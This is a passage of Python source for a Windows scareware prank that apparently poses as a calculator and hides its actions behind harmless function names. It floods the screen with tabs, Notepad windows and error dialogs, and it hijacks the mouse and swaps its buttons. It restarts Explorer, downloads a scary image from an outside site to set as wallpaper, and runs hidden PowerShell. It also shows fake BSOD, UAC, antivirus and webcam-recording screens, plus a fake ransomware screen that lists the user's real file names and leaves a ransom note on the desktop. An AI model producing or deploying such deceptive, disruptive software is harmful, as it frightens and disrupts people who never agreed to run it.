    ps = ("Add-Type -AssemblyName System.Speech; "
          "$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; "
          "$s.Rate=-3; "
          "$s.Speak('Your files have been encrypted.'); "
          "$s.Speak('Send half a bitcoin to the address on screen.'); "
          "$s.Speak('Just kidding. This is a calculator. Cal says hi.'); "
          "$s.Dispose()")
    subprocess.Popen(
        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
        creationflags=subprocess.CREATE_NO_WINDOW)
def siren():
    for _ in range(BEEP_CYCLES):
        winsound.Beep(880, 180)
        winsound.Beep(440, 180)
def evil_riff():
    for f in (660, 622, 587, 554, 523, 494, 466, 440,
              415, 392, 370, 349):
        winsound.Beep(f, 200)
        time.sleep(0.05)
# ------------------------------------------------------------------
# Spam threads
# ------------------------------------------------------------------
def tab_flood():
    """Open a pile of browser tabs in the default browser."""
    if not WINDOWS:
        return
    urls = list(TAB_FLOOD_URLS)
    random.shuffle(urls)
    for url in urls[:TAB_SPAM]:
        try:
            os.startfile(url)
        except OSError:
            pass
        time.sleep(random.uniform(1.0, 2.0))
def notepad_flood():
    """Open notepad windows full of creepy text."""
    if not WINDOWS:
        return
    for _ in range(NOTEPAD_SPAM):
        name = f"note_{random.getrandbits(32):08X}.txt"
        path = os.path.join(SCARE_DIR, name)
        try:
            os.makedirs(SCARE_DIR, exist_ok=True)
            with open(path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(random.choice(NOTEPAD_TEXTS))
        except OSError:
            continue
        try:
            subprocess.Popen(["notepad", path],
                             creationflags=subprocess.CREATE_NO_WINDOW)
        except OSError:
            try:
                os.startfile(path)
            except OSError:
                pass
        time.sleep(random.uniform(1.0, 2.2))
def msgbox_spam():
    """Real modal error dialogs, staggered."""
    if not WINDOWS:
        return
    for title, text in random.sample(MSGBOX_ALERTS, MSGBOX_SPAM):
        time.sleep(random.uniform(2.0, 5.0))
        play_sound("SystemHand")
        try:
            user32.MessageBoxW(0, text, title, 0x10 | 0x1000)
        except Exception:
            pass
def explorer_spam():
    """Open a few Explorer windows on System32."""
    for _ in range(5):
        try:
            os.startfile(os.environ.get("SystemRoot", "C:\\Windows"))
        except OSError:
            pass
        time.sleep(1.2)
def icon_chaos(backup, state):
    """Create shortcuts, force a re-sort, restart Explorer."""
    state["shortcuts"] = create_shortcuts(ICON_SPAM)
    scramble_icons(backup)
    restart_explorer()
    time.sleep(2)
    explorer_spam()
# ------------------------------------------------------------------
# Screen 1: fake BIOS boot
# ------------------------------------------------------------------
def boot_preview():
    root = make_screen("black", "white")
    lines = ["Phoenix CalBIOS v2.2.1",
             "CPU : Intel(R) Core(TM) i9-11900K @ 3.50GHz",
             "Memory Test : 65536M OK",
             "Detecting IDE drives ... OK",
             "Boot from Hard Disk ...",
             "",
             "Starting Windows ..."]
    state = {"idx": 0}
    def tick():
        if state["idx"] < len(lines):
            tk.Label(root, text=lines[state["idx"]],
                     font=("Consolas", 13), fg="white", bg="black",
                     anchor="w").pack(anchor="w", padx=40)
            state["idx"] += 1
            root.after(700, tick)
        else:
            tk.Label(root, text="Loading cal32.sys ... FAILED",
                     font=("Consolas", 13, "bold"), fg="red",
                     bg="black", anchor="w").pack(anchor="w", padx=40)
            root.after(1600, root.destroy)
    root.after(300, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 2: BOOTMGR is missing
# ------------------------------------------------------------------
def bootmgr_missing():
    root = make_screen("black", "white")
    label(root, "", 6, "white", "black")
    label(root, "BOOTMGR is missing", 36, "white", "black", pady=30)
    label(root, "Press Ctrl+Alt+Del to restart", 14, "#AAAAAA", "black")
    root.after(BOOTMGR_S * 1000, root.destroy)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 3: BSOD with fake QR
# ------------------------------------------------------------------
def draw_fake_qr(cv, size=140):
    n = 21
    cell = size // n
    for y in range(n):
        for x in range(n):
            if random.random() < 0.5:
                cv.create_rectangle(x * cell, y * cell,
                                    (x + 1) * cell, (y + 1) * cell,
                                    fill="white", outline="")
    for fx, fy in [(0, 0), (n - 7, 0), (0, n - 7)]:
        cv.create_rectangle(fx * cell, fy * cell,
                            (fx + 7) * cell, (fy + 7) * cell,
                            fill="white", outline="")
        cv.create_rectangle((fx + 1) * cell, (fy + 1) * cell,
                            (fx + 6) * cell, (fy + 6) * cell,
                            fill="black", outline="")
        cv.create_rectangle((fx + 2) * cell, (fy + 2) * cell,
                            (fx + 5) * cell, (fy + 5) * cell,
                            fill="white", outline="")
def show_error_screen():
    play_sound("SystemHand")
    root = make_screen("black", "white")
    label(root, ":(", 96, "white", "black", pady=40)
    label(root, "Your PC ran into a problem and needs to restart.",
          18, "white", "black")
    label(root, "We're just collecting some error info, and then we'll "
                "restart for you.", 12, "#AAAAAA", "black")
    pct = label(root, "0% complete", 13, "#AAAAAA", "black")
    stop = label(root, random.choice(STOP_CODES) + " (CAL_2_2)",
                 12, "#4CC2FF", "black")
    cv = tk.Canvas(root, width=150, height=150, bg="black",
                   highlightthickness=0)
    cv.pack(side="left", padx=40, pady=20)
    draw_fake_qr(cv)
    def tick(i=0):
        if i >= 100:
            root.destroy()
            return
        pct.config(text=f"{i}% complete")
        if i % 17 == 0:
            stop.config(text=random.choice(STOP_CODES) + " (CAL_2_2)")
        root.after(BSOD_S * 10, tick, i + 1)
    root.after(400, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 4: Automatic Repair loop
# ------------------------------------------------------------------
def automatic_repair():
    play_sound("SystemExclamation")
    root = make_screen("#0078D7", "white")
    txt = label(root, "", 22, "white", "#0078D7", pady=180)
    state = {"n": 0, "phase": 1}
    def phase1():
        state["n"] += 1
        txt.config(text="Preparing Automatic Repair" + "." * (state["n"] % 4))
        root.after(450, phase1)
    def phase2():
        state["phase"] = 2
        txt.config(text="Diagnosing your PC")
        cv = tk.Canvas(root, width=120, height=120, bg="#0078D7",
                       highlightthickness=0)
        cv.pack()
        state["cv"] = cv
        state["angle"] = 0
        def spin():
            if state["phase"] != 2:
                return
            state["angle"] = (state["angle"] + 30) % 360
            cv.delete("all")
            cv.create_arc(10, 10, 110, 110, start=state["angle"],
                          extent=80, style="arc", outline="white", width=7)
            root.after(50, spin)
        spin()
    def phase3():
        state["phase"] = 3
        for w in root.winfo_children():
            w.destroy()
        label(root, "Automatic Repair couldn't repair your PC",
              20, "white", "#0078D7", pady=60)
        label(root, "Press \"Advanced options\" to try other options "
                    "for repairing your PC.", 12, "#DDDDDD", "#0078D7")
        tk.Button(root, text="Advanced options",
                  command=root.destroy, bg="#DDDDDD").pack(pady=8)
        tk.Button(root, text="Restart",
                  command=root.destroy).pack(pady=4)
        root.after(4500, root.destroy)
    root.after(400, phase1)
    root.after(4200, phase2)
    root.after(8500, phase3)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 5: chkdsk
# ------------------------------------------------------------------
def chkdsk_screen():
    root = make_screen("black", "white")
    for line in ["Microsoft Windows [Version 10.0.26100.3194]",
                 "Checking file system on C:",
                 "The type of the file system is NTFS.",
                 ""]:
        tk.Label(root, text=line, font=("Consolas", 13),
                 fg="white", bg="black", anchor="w").pack(anchor="w", padx=40)
    log = tk.Text(root, bg="black", fg="white", font=("Consolas", 13),
                  height=12, width=100, highlightthickness=0)
    log.pack(padx=40)
    pct = label(root, "", 13, "white", "black")
    state = {"stage": 1, "pct": 0, "dead": False}
    def tick():
        if state["dead"]:
            return
        state["pct"] += random.randint(1, 6)
        if state["pct"] >= 100:
            if state["stage"] < 5:
                state["stage"] += 1
                state["pct"] = 0
                log.insert("end", f"\nStage {state['stage']} of 5 ...\n")
            else:
                state["dead"] = True
                log.insert("end",
                           "\nAn unexpected error (0xC0000225) occurred.\n"
                           "Windows will restart automatically.\n")
                pct.config(text="chkdsk terminated")
                root.after(1500, root.destroy)
                return
        pct.config(text=f"Stage {state['stage']} of 5 ... {state['pct']}%")
        root.after(90, tick)
    root.after(400, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 6: distortion + mouse takeover
# ------------------------------------------------------------------
def render_distortion():
    root = make_screen("black", "white")
    cv = tk.Canvas(root, bg="black", highlightthickness=0)
    cv.pack(fill="both", expand=True)
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    start = time.time()
    def frame():
        if time.time() - start > 5:
            root.destroy()
            return
        cv.delete("all")
        for _ in range(random.randint(25, 55)):
            x = random.randint(-200, w)
            y = random.randint(-200, h)
            rw = random.randint(40, 500)
            rh = random.randint(1, 40)
            cv.create_rectangle(x, y, x + rw, y + rh,
                                fill=random.choice(GLITCH_COLORS), outline="")
        if random.random() < 0.12:   # occasional full white flash
            cv.create_rectangle(0, 0, w, h, fill="white", outline="")
        if random.random() < 0.2:
            x = random.randint(0, w - 300)
            y = random.randint(0, h - 40)
            cv.create_text(x, y, text=random.choice(GLITCH_PHRASES),
                           font=("Consolas", random.randint(12, 48), "bold"),
                           fill="white", anchor="nw")
        root.after(30, frame)
    root.after(30, frame)
    root.mainloop()
def run_cursor_trails(duration, ghosts=10, size=26):
    if not WINDOWS:
        return
    try:
        root = tk.Tk()
    except tk.TclError:
        return
    root.withdraw()
    colors = ["#00FF00", "#FF0000", "#00FFFF"]
    wins = []
    for i in range(ghosts):
        win = tk.Toplevel(root)
        win.overrideredirect(True)
        win.attributes("-topmost", True)
        win.attributes("-alpha", max(0.10, 0.75 - i * 0.065))
        win.geometry(f"{26}x{26}+0+0")
        win.configure(bg="#FF00FF")
        try:
            win.attributes("-transparentcolor", "#FF00FF")
        except tk.TclError:
            pass
        cv = tk.Canvas(win, width=26, height=26, bg="#FF00FF",
                       highlightthickness=0)
        cv.pack()
        wins.append((win, cv, colors[i % len(colors)]))
    history = []
    start = time.time()
    def tick():
        if time.time() - start > duration:
            root.destroy()
            return
        history.append((root.winfo_pointerx(), root.winfo_pointery()))
        if len(history) > ghosts * 2 + 2:
            history.pop(0)
        for i, (win, cv, color) in enumerate(wins):
            idx = max(0, len(history) - 1 - i * 2)
            if idx >= len(history):
                continue
            x, y = history[idx]
            win.geometry(f"{26}x{26}+{x - 13}+{y - 13}")
            cv.delete("all")
            if random.random() < 0.08:
                cv.create_polygon(2, 2, 2, 22, 18, 22,
                                  fill="#FF0000", outline="")
            else:
                cv.create_polygon(2, 2, 2, 22, 18, 22,
                                  fill=color, outline="")
        root.after(15, tick)
    root.after(15, tick)
    root.mainloop()
def stage_mouse():
    if not WINDOWS:
        return
    w = user32.GetSystemMetrics(0)
    h = user32.GetSystemMetrics(1)
    end = time.time() + 5
    while time.time() < end:
        user32.SetCursorPos(random.randint(0, w - 1),
                            random.randint(0, h - 1))
        time.sleep(0.02)
    user32.SwapMouseButton(True)
    time.sleep(3)
    user32.SwapMouseButton(False)
def run_motion_preview():
    t1 = threading.Thread(target=stage_mouse, daemon=True)
    t2 = threading.Thread(target=run_cursor_trails,
                          args=(GLITCH_S,), daemon=True)
    t1.start()
    t2.start()
    render_distortion()
    t1.join(timeout=1)
    t2.join(timeout=1)
# ------------------------------------------------------------------
# Screen 7: matrix rain
# ------------------------------------------------------------------
def matrix_demo():
    root = make_screen("black", "white")
    cv = tk.Canvas(root, bg="black", highlightthickness=0)
    cv.pack(fill="both", expand=True)
    w = root.winfo_screenwidth()
    h = root.winfo_screenheight()
    chars = "ABCDEF0123456789アイウエオカキクケコサシスセソ"
    cols = w // 14
    drops = [random.randint(-60, h // 14) for _ in range(cols)]
    start = time.time()
    def tick():
        if time.time() - start > MATRIX_S:
            root.destroy()
            return
        cv.delete("all")
        for i in range(cols):
            x = i * 14
            y = drops[i] * 14
            c = random.choice(chars)
            color = "#00FF00" if random.random() < 0.85 else "#FFFFFF"
            cv.create_text(x, y, text=c, fill=color,
                           font=("Consolas", 14), anchor="nw")
            if y > h and random.random() > 0.975:
                drops[i] = random.randint(-60, -1)
            drops[i] += 1
        root.after(40, tick)
    root.after(40, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 8: webcam overlay
# ------------------------------------------------------------------
def webcam_scare():
    root = make_screen("black", "#00FF00")
    cv = tk.Canvas(root, bg="black", highlightthickness=0)
    cv.pack(fill="both", expand=True)
    user = "user"
    try:
        user = os.getlogin()
    except OSError:
        pass
    w = root.winfo_screenwidth()
    h = root.winfo_screenheight()
    state = {"t": 0}
    def tick():
        state["t"] += 1
        if state["t"] > WEBCAM_S * 30:
            root.destroy()
            return
        cv.delete("all")
        for _ in range(400):
            x = random.randint(0, w)
            y = random.randint(0, h)
            g = random.randint(0, 255)
            cv.create_rectangle(x, y, x + 2, y + 2,
                                fill=f"#00{g:02X}00", outline="")
        cv.create_rectangle(20, 20, 190, 55, fill="black", outline="")
        cv.create_oval(28, 28, 48, 48, fill="#FF0000", outline="")
        cv.create_text(60, 38, text="REC", font=("Consolas", 14, "bold"),
                       fill="#FF0000", anchor="w")
        cv.create_text(20, h - 50,
                       text=f"CAM_0 ACTIVE  |  viewer: {user}",
                       font=("Consolas", 16, "bold"), fill="#00FF00",
                       anchor="sw")
        root.after(33, tick)
    root.after(33, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 9: hacked cmd console
# ------------------------------------------------------------------
def hacker_console():
    root = tk.Tk()
    root.title("Administrator: C:\\Windows\\system32\\cmd.exe")
    root.geometry("820x520+120+80")
    root.configure(bg="black")
    root.attributes("-topmost", True)
    txt = tk.Text(root, bg="black", fg="#CCCCCC", font=("Consolas", 12),
                  insertbackground="white", highlightthickness=0)
    txt.pack(fill="both", expand=True)
    txt.tag_configure("red", foreground="#FF5555")
    lines = [
        ("Microsoft Windows [Version 10.0.26100.3194]", ""),
        ("(c) Microsoft Corporation. All rights reserved.", ""),
        ("", ""),
        ("C:\\Windows\\system32> del /f /s /q C:\\Windows\\System32\\kernel32.dll", ""),
        ("ACCESS DENIED: you do not have sufficient privileges.", "red"),
        ("", ""),
        ("C:\\Windows\\system32> format C: /q /y", ""),
        ("WARNING, ALL DATA ON NON-REMOVABLE DISK", ""),
        ("DRIVE C: WILL BE LOST!", ""),
        ("Proceed with Format (Y/N)? Y", ""),
        ("Access denied - the volume is in use by another process.", "red"),
        ("", ""),
        ("C:\\Windows\\system32> shutdown /s /t 10", ""),
        ("A system shutdown has already been scheduled. (1190)", ""),
        ("", ""),
        ("C:\\Windows\\system32> net user Administrator /active:no", ""),
        ("Access is denied.", "red"),
        ("", ""),
        ("C:\\Windows\\system32> calcu32.exe --self-destruct", ""),
        ("", ""),
        ("C:\\Windows\\system32>_", ""),
    ]
    def type_line(idx=0, ci=0):
        if idx >= len(lines):
            root.after(CONSOLE_S * 1000, root.destroy)
            return
        text, color = lines[idx]
        if ci < len(text):
            txt.insert("end", text[ci], color if color else None)
            txt.see("end")
            root.after(8, type_line, idx, ci + 1)
        else:
            txt.insert("end", "\n")
            txt.see("end")
            root.after(250, type_line, idx + 1, 0)
    root.after(300, type_line)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 10: fake UAC
# ------------------------------------------------------------------
def fake_uac():
    root = tk.Tk()
    root.title("User Account Control")
    root.configure(bg="#FFFFFF")
    root.attributes("-topmost", True)
    w, h = 480, 250
    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
    root.geometry(f"{w}x{h}+{(sw - w) // 2}+{(sh - h) // 2}")
    banner = tk.Frame(root, bg="#E8F0FE")
    banner.pack(fill="x")
    cv = tk.Canvas(banner, width=56, height=56, bg="#E8F0FE",
                   highlightthickness=0)
    cv.pack(side="left", padx=14, pady=12)
    cv.create_polygon(28, 8, 46, 16, 42, 34, 28, 48, 14, 34, 10, 16,
                      fill="#2B579A", outline="")
    cv.create_polygon(28, 16, 40, 21, 37, 33, 28, 41, 19, 33, 16, 21,
                      fill="#FFFFFF", outline="")
    tk.Label(banner,
             text="Do you want to allow this app to make changes\n"
                  "to your device?",
             font=("Segoe UI", 12, "bold"), bg="#E8F0FE",
             justify="left").pack(side="left", pady=20)
    tk.Label(root, text="CAL-OS System Integrity Checker",
             font=("Segoe UI", 11), bg="#FFFFFF").pack(pady=(18, 4))
    tk.Label(root, text="Verified publisher: Cal Industries Ltd.",
             font=("Segoe UI", 9), fg="#666666",
             bg="#FFFFFF").pack()
    btns = tk.Frame(root, bg="#FFFFFF")
    btns.pack(pady=14)
    tk.Button(btns, text="Yes", width=14,
              command=root.destroy).pack(side="left", padx=6)
    tk.Button(btns, text="No", width=14,
              command=root.destroy).pack(side="left", padx=6)
    root.after(UAC_S * 1000, root.destroy)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 11: fake security scan
# ------------------------------------------------------------------
def scan_for_updates():
    def fake_popup():
        for delay, text in [
            (3, "Critical system error\nMemory corruption detected in cal32.dll"),
            (5, "Threat detected: TROJAN.Win32.CAL\nQuarantine failed"),
            (6, "Your account has been locked.\nContact the administrator."),
            (7, "Windows Defender is unavailable.\nYour PC may be at risk."),
            (9, "WEBCAM_0 is broadcasting.\nViewer count: 3"),
        ]:
            time.sleep(delay)
            play_sound("SystemHand")
            try:
                user32.MessageBoxW(0, text, "CAL-OS ALERT", 0x10 | 0x1000)
            except Exception:
                pass
    root = tk.Tk()
    root.title("Calcu update check")
    root.geometry("560x360+80+80")
    root.configure(bg="black")
    root.attributes("-topmost", True)
    tk.Label(root, text="CAL SECURITY SCANNER", fg="red", bg="black",
             font=("Consolas", 16, "bold")).pack(pady=8)
    tk.Label(root, text="Scanning for malware...", fg="#AAAAAA", bg="black",
             font=("Consolas", 10)).pack()
    log = tk.Text(root, bg="black", fg="#00FF00", font=("Consolas", 9),
                  height=14, width=72, highlightthickness=0)
    log.pack(padx=10, pady=8)
    bar = tk.Canvas(root, width=520, height=18, bg="#111111",
                    highlightthickness=0)
    bar.pack(pady=4)
    pct = tk.Label(root, text="0%", fg="#00FF00", bg="black",
                   font=("Consolas", 10))
    pct.pack()
    dirs = ["C:\\Windows\\System32", "C:\\Users\\Public\\Documents",
            "C:\\ProgramData", "C:\\Windows\\SysWOW64"]
    exts = [".exe", ".dll", ".sys", ".dat", ".bin"]
    start = time.time()
    state = {"pct": 0, "threats": 0, "done": False}
    def add_line(text, tag=None):
        log.insert("end", text + "\n", tag)
        log.see("end")
    def tick():
        elapsed = time.time() - start
        state["pct"] = min(100, int(elapsed / SCAN_S * 100))
        bar.delete("all")
        bar.create_rectangle(0, 0, int(520 * state["pct"] / 100), 18,
                             fill="#00AA00", outline="")
        pct.config(text=f"{state['pct']}%")
        if random.random() < 0.6 and not state["done"]:
            name = f"{random.getrandbits(32):08X}{random.choice(exts)}"
            path = os.path.join(random.choice(dirs), name)
            if random.random() < 0.12:
                state["threats"] += 1
                add_line(f"[!] THREAT: {path}", "red")
            else:
                add_line(path, "green")
        if elapsed >= SCAN_S:
            if not state["done"]:
                state["done"] = True
                add_line("", "red")
                add_line(f"[!] {state['threats']} THREATS DETECTED - "
                         "QUARANTINE FAILED", "red")
                add_line("INITIATING EMERGENCY RESPONSE", "red")
            if elapsed >= SCAN_S + 2.5:
                root.destroy()
                return
        root.after(60, tick)
    log.tag_configure("red", foreground="#FF0000")
    log.tag_configure("green", foreground="#00FF00")
    threading.Thread(target=fake_popup, daemon=True).start()
    root.after(60, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 12: fake system32 deletion
# ------------------------------------------------------------------
def export_results():
    play_sound("SystemHand")
    root = make_screen("black", "red")
    label(root, "CAL-OS FILE SYSTEM", 24, "red", "black", pady=30)
    label(root, "DELETING SYSTEM FILES...", 18, "red", "black")
    label(root, "DO NOT INTERRUPT", 12, "#FF6666", "black")
    log = tk.Text(root, bg="black", fg="#FF0000", font=("Consolas", 9),
                  height=12, width=90, highlightthickness=0)
    log.pack(pady=10)
    bar = tk.Canvas(root, width=640, height=18, bg="#111111",
                    highlightthickness=0)
    bar.pack(pady=6)
    info = label(root, "", 12, "white", "black")
    paths = ["C:\\Windows\\System32\\kernel32.dll",
             "C:\\Windows\\System32\\drivers\\etc\\hosts",
             "C:\\Windows\\System32\\config\\SAM",
             "C:\\Windows\\System32\\ntoskrnl.exe",
             "C:\\Windows\\System32\\user32.dll",
             "C:\\Windows\\System32\\winlogon.exe",
             "C:\\Users\\Public\\Desktop\\*",
             "C:\\Program Files\\Windows Defender\\*"]
    state = {"start": time.time(), "done": False}
    def tick():
        elapsed = time.time() - state["start"]
        pct = min(100, int(elapsed / DELETE_S * 100))
        bar.delete("all")
        bar.create_rectangle(0, 0, int(640 * pct / 100), 18,
                             fill="#AA0000", outline="")
        if random.random() < 0.7 and not state["done"]:
            log.insert("end", "Deleting " + random.choice(paths) +
                       " ... OK\n")
            log.see("end")
        info.config(text=f"{1_500_000 - pct * 15000:,} files remaining"
                         f"  |  {pct}%")
        if elapsed >= DELETE_S and not state["done"]:
            state["done"] = True
            log.insert("end", "\nWindows could not complete the operation.\n")
            log.insert("end", "SYSTEM32 ACCESS DENIED\n")
        if elapsed >= DELETE_S + 2:
            root.destroy()
            return
        root.after(60, tick)
    hide_cursor()
    root.after(60, tick)
    root.mainloop()
    show_cursor()
# ------------------------------------------------------------------
# Wallpaper swap
# ------------------------------------------------------------------
THEME_URL = "https://www.scaryforkids.com/pics/scary-pictures.jpg"
def get_wallpaper():
    if not WINDOWS:
        return ""
    buf = ctypes.create_unicode_buffer(512)
    user32.SystemParametersInfoW(0x14, 0, buf, 0)
    return buf.value
def set_wallpaper(path):
    if not WINDOWS:
        return
    user32.SystemParametersInfoW(20, 0, path, 3)
def make_red_bmp(path, width=800, height=600):
    row = b"\x00\x00\xC0" * width
    pad = b"\x00" * ((4 - (width * 3) % 4) % 4)
    pixels = (row + pad) * height
    header = struct.pack("<2sIHHI", b"BM", 54 + len(pixels), 0, 0, 54)
    info = struct.pack("<IiiHHIIiiII", 40, width, height, 1, 24,
                       0, len(pixels), 2835, 2835, 0, 0)
    with open(path, "wb") as f:
        f.write(header + info + pixels)
def fetch_theme():
    jpg_path = os.path.join(SCARE_DIR, "calcu_theme.jpg")
    try:
        os.makedirs(SCARE_DIR, exist_ok=True)
        with urllib.request.urlopen(THEME_URL, timeout=10) as resp:
            data = resp.read()
        if len(data) < 1000:
            return None
        with open(jpg_path, "wb") as f:
            f.write(data)
        return jpg_path
    except Exception:
        return None
def convert_to_bmp(jpg_path):
    bmp_path = os.path.join(SCARE_DIR, "calcu_theme.bmp")
    ps = (
        "Add-Type -AssemblyName System.Drawing; "
        f"$i=[System.Drawing.Image]::FromFile('{jpg_path}'); "
        "$b=New-Object System.Drawing.Bitmap($i); "
        f"$b.Save('{bmp_path}',[System.Drawing.Imaging.ImageFormat]::Bmp); "
        "$i.Dispose(); $b.Dispose()"
    )
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
             "-Command", ps],
            creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
    except Exception:
        return None
    return bmp_path if os.path.exists(bmp_path) else None
def apply_user_theme():
    jpg_path = fetch_theme()
    bmp_path = None
    if jpg_path:
        bmp_path = convert_to_bmp(jpg_path)
    if not bmp_path:
        bmp_path = os.path.join(SCARE_DIR, "calcu_preview.bmp")
        make_red_bmp(bmp_path)
    set_wallpaper(bmp_path)
    return jpg_path, bmp_path
# ------------------------------------------------------------------
# Screen 13: fake ransomware
# ------------------------------------------------------------------
def real_user_files(limit=6):
    names = []
    for folder in ("Documents", "Pictures", "Downloads", "Desktop",
                   "Music", "Videos"):
        p = os.path.join(os.path.expanduser("~"), folder)
        if not os.path.isdir(p):
            continue
        try:
            for f in sorted(os.listdir(p)):
                if os.path.isfile(os.path.join(p, f)):
                    names.append(os.path.join(folder, f))
                    if len(names) >= limit:
                        return names
        except OSError:
            continue
    return names
def ransomware_screen():
    play_sound("SystemHand")
    user = "user"
    try:
        user = os.getlogin()
    except OSError:
        pass
    host = os.environ.get("COMPUTERNAME", "THIS-PC")
    staging = os.path.join(SCARE_DIR, "calcu_ransom")
    os.makedirs(staging, exist_ok=True)
    fake_files = [os.path.join(staging, f"{random.getrandbits(32):08X}.dat")
                  for _ in range(120)]
    for p in fake_files:
        with open(p, "wb") as f:
            f.write(b"x" * 64)
    note = desktop_note_path()
    if note:
        try:
            with open(note, "w", encoding="utf-8") as f:
                f.write("CAL-OS RANSOMWARE\n")
                f.write(f"All files on {host} have been encrypted.\n")
                f.write("Send 0.5 BTC to the address on screen.\n")
                f.write("(This is a joke. Nothing was encrypted.)\n")
        except OSError:
            note = ""
    root = make_screen("black", "red")
    label(root, "CAL-OS RANSOMWARE", 30, "red", "black", pady=24)
    label(root, f"ALL FILES ON {host} ARE ENCRYPTED", 16, "red", "black")
    label(root, f"victim: {user}", 12, "#FF6666", "black")
    label(root, "Do not close this window. The recovery key expires soon.",
          12, "#FF6666", "black")
    info = label(root, "", 11, "#88FF88", "black", pady=10)
    log = tk.Text(root, bg="black", fg="#FF4444", font=("Consolas", 9),
                  height=6, width=92, highlightthickness=0)
    log.pack(pady=6)
    bar = tk.Canvas(root, width=620, height=20, bg="#111111",
                    highlightthickness=0)
    bar.pack(pady=8)
    countdown = label(root, "", 18, "red", "black")
    real = real_user_files()
    state = {"i": 0, "secs": ENCRYPT_S, "done": False, "renamed": 0}
    def tick():
        if state["done"]:
            return
        state["i"] += 1
        if state["renamed"] < len(fake_files):
            src = fake_files[state["renamed"]]
            dst = src[:-4] + ".crypt"
            try:
                os.rename(src, dst)
            except OSError:
                pass
            state["renamed"] += 1
        pct = min(100, int(state["renamed"] / len(fake_files) * 100))
        bar.delete("all")
        bar.create_rectangle(0, 0, int(620 * pct / 100), 20,
                             fill="#AA0000", outline="")
        if random.random() < 0.25 and real:
            name = random.choice(real)
            log.insert("end", f"encrypted: {name}\n")
            log.see("end")
        elif not real:
            info.config(text="Encrypting C:\\ ...")
        root.after(60, tick)
    def tick_count():
        if state["secs"] <= 0:
            state["done"] = True
            for w in root.winfo_children():
                w.destroy()
            label(root, "REBOOTING...", 34, "white", "black", pady=80)
            label(root, "Preparing recovery environment", 14, "#AAAAAA",
                  "black")
            root.after(1800, root.destroy)
            return
        countdown.config(text=f"Recovery key expires in: {state['secs']}s")
        state["secs"] -= 1
        root.after(1000, tick_count)
    threading.Thread(target=ransom_voice, daemon=True).start()
    tick()
    tick_count()
    root.mainloop()
    return staging, note
# ------------------------------------------------------------------
# Screen 14: fake Windows Update
# ------------------------------------------------------------------
def windows_update_screen():
    play_sound("SystemExclamation")
    root = make_screen("#0067B8", "white")
    label(root, "", 30, "white", "#0067B8")
    sp = tk.Canvas(root, width=100, height=100, bg="#0067B8",
                   highlightthickness=0)
    sp.pack(pady=40)
    txt = label(root, "Working on updates", 22, "white", "#0067B8")
    pct = label(root, "0% complete", 14, "#DDDDDD", "#0067B8")
    label(root, "Don't turn off your PC", 12, "#DDDDDD", "#0067B8")
    state = {"pct": 0, "angle": 0}
    def spin():
        state["angle"] = (state["angle"] + 24) % 360
        sp.delete("all")
        sp.create_arc(5, 5, 95, 95, start=state["angle"], extent=70,
                      style="arc", outline="white", width=8)
        root.after(40, spin)
    def tick():
        state["pct"] = min(100, state["pct"] + random.randint(1, 4))
        pct.config(text=f"{state['pct']}% complete")
        if state["pct"] < 100:
            root.after(120, tick)
        else:
            txt.config(text="We couldn't complete the updates")
            root.after(2000, root.destroy)
    spin()
    tick()
    root.after(UPDATE_S * 1000, root.destroy)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 15: fake sfc
# ------------------------------------------------------------------
def sfc_screen():
    root = make_screen("black", "white")
    for line in ["Microsoft Windows [Version 10.0.26100.3194]",
                 "C:\\Windows\\System32> sfc /scannow", ""]:
        tk.Label(root, text=line, font=("Consolas", 13),
                 fg="white", bg="black", anchor="w").pack(anchor="w", padx=40)
    log = tk.Text(root, bg="black", fg="white", font=("Consolas", 13),
                  height=14, width=100, highlightthickness=0)
    log.pack(padx=40)
    log.insert("end", "Beginning system scan. This process will take "
                      "some time.\n\n")
    lines = ["Verifying 100% complete.", "",
             "Windows Resource Protection found corrupt files",
             "and was unable to fix some of them.",
             "",
             "Corrupted files:",
             "  C:\\Windows\\System32\\drivers\\cal32.sys",
             "  C:\\Windows\\System32\\config\\SYSTEM",
             "  C:\\Windows\\System32\\win32k.sys",
             "",
             "Reboot required. Restarting in 5 seconds..."]
    idx = [0]
    def tick():
        if idx[0] < len(lines):
            log.insert("end", lines[idx[0]] + "\n")
            log.see("end")
            idx[0] += 1
            root.after(500, tick)
        else:
            root.after(1200, root.destroy)
    root.after(300, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 16: fake sign-out
# ------------------------------------------------------------------
def shutdown_scare():
    root = make_screen("black", "white")
    try:
        root.attributes("-alpha", 0.85)
    except tk.TclError:
        pass
    panel = tk.Frame(root, bg="#F0F0F0")
    panel.place(relx=0.5, rely=0.5, anchor="center")
    tk.Label(panel, text="You are about to be signed out",
             font=("Segoe UI", 16, "bold"), bg="#F0F0F0"
             ).pack(padx=40, pady=(24, 6))
    tk.Label(panel, text="Windows will shut down in:",
             font=("Segoe UI", 11), bg="#F0F0F0").pack()
    cnt = tk.Label(panel, text="10", font=("Segoe UI", 40, "bold"),
                   fg="#C42B1C", bg="#F0F0F0")
    cnt.pack(pady=4)
    tk.Button(panel, text="Cancel", command=root.destroy,
              width=12).pack(pady=(4, 20))
    secs = [10]
    def tick():
        secs[0] -= 1
        cnt.config(text=str(secs[0]))
        if secs[0] <= 0:
            root.destroy()
            return
        root.after(1000, tick)
    root.after(1000, tick)
    root.mainloop()
# ------------------------------------------------------------------
# Screen 17: the reveal
# ------------------------------------------------------------------
def reveal_screen():
    root = make_screen("black", "#00FF00")
    label(root, "PSYCH!", 72, "#00FF00", "black", pady=50)
    label(root, "Just kidding. Nothing happened.", 20, "#00FF00", "black")
    label(root, "No files, no wallpaper, no mouse. Cal says hi.",
